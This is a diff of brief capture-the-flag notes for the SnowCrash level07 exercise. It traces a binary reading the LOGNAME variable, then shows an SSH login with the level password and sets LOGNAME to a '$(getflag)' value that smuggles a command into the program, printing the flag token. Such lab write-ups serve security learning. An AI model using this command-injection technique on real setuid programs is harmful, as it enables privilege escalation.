@@ -1,10 +1,16 @@
-🔻 Analyze
-⬇️ ltrace ./level07
-👉 getenv("LOGNAME")
++ ---- 🔻 Analyze ----
+|
+|   ltrace ./level07
+|   👉 getenv("LOGNAME")
+|
 
 
-🔻 Hack
-⬇️ export LOGNAME=\$\(getflag\)
-⬇️ env | grep LOGNAME
-⬇️ ./level07
-👉 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
++ ---- 🔻 Hack -------
+|
+|   ssh level07@$SNOW_CRASH_IP -p 4242
+|   └ wiok45aaoguiboiki2tuin6ub
+|   export LOGNAME=\$\(getflag\)
+|   env | grep LOGNAME
+|   ./level07
+|   👉 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+|
